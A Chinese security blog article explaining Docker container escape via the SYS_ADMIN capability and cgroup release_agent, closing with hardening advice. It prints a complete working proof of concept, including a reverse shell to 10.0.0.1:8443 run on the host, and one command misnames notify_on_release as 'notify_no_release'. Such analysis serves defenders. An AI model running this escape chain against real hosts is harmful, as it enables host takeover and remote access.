作者：中兴沉烽实验室_wh

## 前言

Docker容器的不安全配置可能导致应用存在容器逃逸漏洞。本文将详细介绍利用SYS_ADMIN Capability进行容器逃逸的原理。

Docker容器不同于虚拟机，它共享宿主机操作系统内核。宿主机和容器之间通过内核命名空间（namespaces）、内核Capabilities、CGroups（control
groups）等技术进行隔离。

Linux内核在2.2版本之后，将root权限细分成了多个被称为[Capability](https://man7.org/linux/man-pages/man7/capabilities.7.html)的单元。比如，Docker容器里可能需要把Web
server绑定到值小于1024的端口上，这个操作需要的Capability是“CAP_NET_BIND_SERVICE”，如果给执行Web
server的用户授予这个Capability，那么在绑定端口的时候，Web server就不需要以root用户运行了。

在大部分情况下，容器里的进程不需要以“完整”的root用户运行，Docker给容器内root账号只授予了几个[默认的Capabilities](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L16)，其他的禁用。这意味着容器里的root用户权限比宿主机上真正的root用户权限要小的多。

而在实际的使用过程中，很多用户会违背Docker的这些安全防护配置原则。比如为了方便，容器以root用户启动，同时为了执行一些特权操作，给root用户额外授权一些Capability，例如SYS_ADMIN。

如果一个Docker容器的启动方式满足以下条件，攻击者在容器中就可以逃逸到宿主机上。

  1. 以root用户的身份在容器内运行；

  2. 容器启用SYS_ADMIN Capability；

  3. 容器没有启用Docker默认的AppArmor配置文件docker-default，或者AppArmor允许运行mount syscall;

其中，条件1和2是必需的，而条件3在某些宿主机上比较容易满足，比如CentOS等Red Hat系的Linux操作系统上默认没有安装AppArmor。

例如以下面的命令开启一个Ubuntu容器：

    
    
    docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
    

其中，”--cap-add=SYS_ADMIN“表示给Docker容器SYS_ADMIN的Capability。“--security-opt
apparmor=unconfined”表示去除Docker默认的AppArmor配置。

攻击者可以在容器内通过挂载宿主机cgroup，并利用cgroup
notify_on_release的特性在宿主机执行shell，从而实现容器逃逸。执行步骤如下：

  1. 容器内挂载宿主机cgroup，并自定义一个cgroup；

    
    
    mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    

  2. 配置该cgroup的notify_no_release和release_agent；

    
    
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "sh -i >& /dev/tcp/10.0.0.1/8443 0>&1" >> /cmd
    chmod a+x /cmd
    

这里使用了sh tcp的反弹shell来逃逸容器，也可以执行其他任意linux shell命令。

  3. 触发release_agent执行。

    
    
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    

下面详细说明一下各个步骤的操作和原理。

## 0x01 挂载宿主机cgroup

漏洞利用第一步是挂载宿主机的memory cgroup。

cgroup（control group、控制群组）是 Linux kernel一项进行资源分配（如 CPU
时间、系统内存、网络带宽或者这些资源的组合）的功能。使用`mount -t cgroup`命令可以查看宿主机当前的cgroup。

![1-mount-t.png](https://image.3001.net/images/20210302/1614667823_603de02f537cfc1081a32.png!small)

进到要挂载的memory cgroup里。

![2-memory.png](https://image.3001.net/images/20210302/1614667838_603de03eaea3c6ed65214.png!small)

该文件夹包含了系统管理员对memory资源的配置，其中docker文件夹里包含了docker针对容器memory资源的默认cgroup配置。

### 0x011 容器cgroup

默认情况下，容器在启动时会在`/sys/fs/cgroup`目录各个subsystem目录的docker子目录里，生成以容器 ID 为名字的子目录

查看宿主机里的memory
cgroup目录，可以看到docker目录里多了一个目录`9d14bc4987d5807f691b988464e167653603b13faf805a559c8a08cb36e3251a`，这一串字符是容器ID，这个目录里的内容就是用户在容器里查看`/sys/fs/cgroup/memory`的内容。

![3-docker.png](https://image.3001.net/images/20210302/1614667850_603de04a9b40167e833c4.png!small)

### 0x012 mount系统调用

mount命令是一个系统调用（syscall）命令，系统调用号为165。执行syscall需要用户具备CAP_SYS_ADMIN的Capability。

如果在宿主机启动时，添加了`--cap-add
SYS_ADMIN`参数，那root用户就能在容器内部就能执行mount挂载cgroup。（docker默认情况下不会开启SYS_ADMIN
Capability）

### 0x013 容器内挂载cgroup

漏洞利用的第一步是在容器里创建一个临时目录`/tmp/cgrp`，并使用`mount`命令将系统默认的memory类型的cgroup重新挂载到`/tmp/cgrp`上。

    
    
    mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
    

其中，`-t`参数表示mount的类别为cgroup，`-o`表示挂载的选项。对于cgroup，挂载选项就是cgroup的subsystem，每个subsystem代表一种资源类型，比如cpu、memory。具体可以参考链接：[cgroup
subsystems](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/resource_management_guide/sec-creating_a_hierarchy_and_attaching_subsystems)。

执行该命令之后，宿主机的memory cgroup被挂载到了容器中，对应目录/tmp/cgrp。

![4-mount-cgroup.PNG](https://image.3001.net/images/20210302/1614667878_603de0660f57ec76f8bc7.png!small)

需要注意的是，对cgroup进行重新挂载的操作时，只有当被挂载目标的hierarchy为空时才能成功。因此，如果这里memory的重新挂载不成功的话，可以换其他的subsystem。

接着就是在这个cgroup类型里建一个子目录x。

    
    
    mkdir /tmp/cgrp/x
    

查看`/tmp/cgrp/x`可以发现有很多和memory相关的配置。

![5-cgrp-x.PNG](https://image.3001.net/images/20210302/1614667891_603de0737245adac2efc5.png!small)

接下来将使用`x`来作为POC操作的主要目标。

## 0x02 notify_no_release

漏洞利用的第二步和notify_no_release有关。cgroup的每一个subsystem都有参数notify_on_release，这个参数值是Boolean型，1或0。分别可以启动和禁用释放代理的指令。如果notify_on_release启用，当cgroup不再包含任何任务时（即，cgroup的tasks文件里的PID为空时），系统内核会执行release_agent参数指定的文件里的内容。

需要注意的是release_agent文件并不在`/tmp/cgrp/x`目录里，而是在memory
cgroup的根目录`/tmp/cgrp`里。这样的设计可以用来自动移除根cgroup里所有空的cgroup。

将/tmp/cgrp/x的notify_no_release属性设置为1。

    
    
    echo 1 > /tmp/cgrp/x/notify_no_release
    

接着将release_agent指定为容器在宿主机上的cmd文件。具体操作是先获取docker容器在宿主机上的存储路径。

    
    
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    

文件/etc/mtab存储了容器中实际挂载的文件系统。

![6-etc-mtab.PNG](https://image.3001.net/images/20210302/1614667913_603de08940fa4d2c578eb.png!small)

这里使用`sed`命令匹配`perdir=(`和`)`之间的非逗号内容，从上图可以看出，`host_path`就是docker的overlay存储驱动上的可写目录upperdir.

![7-upperdir.png](https://image.3001.net/images/20210302/1614667921_603de091a7b52c1be5bed.png!small)

在这个目录里创建一个cmd文件，并把它作为/tmp/cgrp/x/release_agent参数指定的文件。

    
    
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    

## 0x03 容器逃逸

接下来，POC将要执行的shell写到cmd文件里，并赋予执行权限。

    
    
    echo '#!/bin/sh' > /cmd
    echo "sh -i >& /dev/tcp/10.0.0.1/8443 0>&1" >> /cmd
    chmod a+x /cmd
    

最后，POC触发宿主机执行cmd文件中的shell。

    
    
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    

该命令启动一个sh进程，将sh进程的PID写入到/tmp/cgrp/x/cgroup.procs里，这里的`\$\$`表示sh进程的PID。

在执行完`sh -c`之后，sh进程自动退出，这样cgroup
`/tmp/cgrp/x`里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行。

![8-rev-shell.png](https://image.3001.net/images/20210302/1614667934_603de09eef2bfe21c6680.png!small)

## 0x04 AppArmor和seccomp

利用SYS_ADMIN权限逃逸Docker容器的关键在于容器要能够挂载宿主机的cgroup。为禁止容器执行mount
syscall，Docker在限制用户Capabilities的基础上，会默认开启AppArmor和seccomp这两个安全防护工具。但关于这两个工具的配置，Docker给出的默认配置有一些值得注意的“瑕疵”。

### 0x041 AppArmor

关于AppArmor，CentOS等Red
Hat系的Linux操作系统上默认没有安装AppArmor。这样文章开头提到的漏洞利用条件第3条，“容器必须没有启用Docker默认的AppArmor配置文件docker-default，或者AppArmor允许运行mount syscall”，将很容易满足，不需要显式地添加“--security-opt
apparmor=unconfined”参数。

AppArmor(Application
Armor)是Linux内核的一个安全模块，AppArmor允许系统管理员将每个程序与一个安全配置文件关联，从而限制程序的功能。简单的说，AppArmor是与SELinux类似的一个访问控制系统，通过它用户可以指定程序可以读、写或运行哪些文件，是否可以打开网络端口等。

比如，[Docker官网](https://docs.docker.com/engine/security/apparmor/)给出了一个Nginx加固的例子。

    
    
    profile docker-nginx flags=(attach_disconnected,mediate_deleted) {
      #include <abstractions/base>
    
      ...
    
      deny /bin/** wl,
      deny /boot/** wl,
      deny /dev/** wl,
      deny /etc/** wl,
      deny /home/** wl,
    
      ...
    

其中，deny /bin/** wl表示阻止/bin目录下及任意层子目录下的写权限，w：写，l：创建硬链接。

Docker采用的默认配置文件是docker-default。它具有适度的保护性，同时提供广泛的应用程序兼容性。查看该配置文件[生成模板](https://github.com/moby/moby/blob/master/profiles/apparmor/template.go)，可以发现在第43行配置了禁止容器调用mount。

    
    
    ...
    
      deny mount,
    
      deny /sys/[^f]*/** wklx,
      deny /sys/f[^s]*/** wklx,
      deny /sys/fs/[^c]*/** wklx,
      deny /sys/fs/c[^g]*/** wklx,
      deny /sys/fs/cg[^r]*/** wklx,
    
      ...
    

这里也可以发现，该配置文件并没有禁止对/sys/fs/cgroup目录的读写。如果在实际利用过程中，发现容器里无法读写cgroup目录，可以检查容器是否在AppArmor配置里禁止了对cgroup目录的读写。

Docker默认情况下使用docker-default策略启动容器。此时，即使使用SYS_ADMIN
Capbility运行该容器，它也会阻止容器执行mount系统调用。除非在容器启动时用参数`--security-opt
apparmor=unconfined`覆盖配置。

虽然Docker默认的AppArmor配置能很好地阻止容器调用mount，但并不是所有的宿主机都支持AppArmor。对于Debian系的linux，比如Ubuntu，默认安装了AppArmor和SeLinux。而对于Red
hat系的linux，比如CentOS，默认使用SeLinux，没有安装AppArmor。这就导致在Red
hat系linux宿主机上，有可能不需要容器启用`--security-opt
apparmor=unconfined`参数也能执行mount系统调用。在某个CentOS测试机上进行测试，结果如下：

![9-apparmor.PNG](https://image.3001.net/images/20210302/1614667953_603de0b178e7b8050de17.png!small)

查看docker info，可以发现安全选项“Security
Options”里没有开启AppArmor，只开启了seccomp。因此，在仅添加“--cap-add=SYS_ADMIN”参数的情况下CentOS宿主机仍然能成功执行POC。

![10-docker-info.png](https://image.3001.net/images/20210302/1614667963_603de0bb84255f2ffb8ba.png!small)

### 0x042 seccomp

在上一节的docker info输出中，可以看到Docker也会有一个默认的seccomp配置。那为什么seccomp没有能阻止容器调用mount？

这得从Docker[默认的seccomp配置](https://docs.docker.com/engine/security/seccomp/)说起，在[配置模板](https://github.com/moby/moby/blob/master/profiles/seccomp/default.json)里，关于mount的配置从第600行开始。

    
    
    {
    			"names": [
    				"bpf",
    				"clone",
    				"fanotify_init",
    				"fsconfig",
    				"fsmount",
    				"fsopen",
    				"fspick",
    				"lookup_dcookie",
    				"mount",
    				"move_mount",
    				"name_to_handle_at",
    				"open_tree",
    				"perf_event_open",
    				"quotactl",
    				"setdomainname",
    				"sethostname",
    				"setns",
    				"syslog",
    				"umount",
    				"umount2",
    				"unshare"
    			],
    			"action": "SCMP_ACT_ALLOW",
    			"args": [],
    			"comment": "",
    			"includes": {
    				"caps": [
    					"CAP_SYS_ADMIN"
    				]
    			},
    			"excludes": {}
    		},
    

可以看到，Docker seccomp默认配置仅依靠SYS_ADMIN来限制执行mount系统调用。如果容器启动时使用了“--cap-add=SYS_ADMIN”参数，那么seccomp就不能很好地防护容器了。

## 0x05 Docker加固

上文详细介绍了Docker SYS_ADMIN容器逃逸的原理。相应地，加固Docker容器可以采取以下步骤：

  * 不要使用特权模式（--privileged)参数来启动容器，在特权模式下，容器具备SYS_ADMIN Capability；

  * 不要使用root用户运行容器，使用不同的user namespaces，Docker仅仅通过Namespaces、Capabilites、cgroups等机制来限制容器内root账号对宿主机的操作；

  * 禁止所有Capability，仅开启必需的Capability；

  * 使用“no-new-privileges”安全选项，容器启动时添加“--security-opt no-new-privileges”参数，该安全选项能阻止容器内的普通用户通过sudo、su、suid等方法提权为root用户；

  * 适当地配置AppArmor或seccomp，限制容器执行系统调用，对于不支持AppArmor的操作系统，也可以配置SELinux；

  * 使用官方docker镜像，或者基于官方镜像构建自己的镜像，防止镜像存在后门；

  * 及时给docker镜像打补丁，不要使用存在漏洞的镜像。

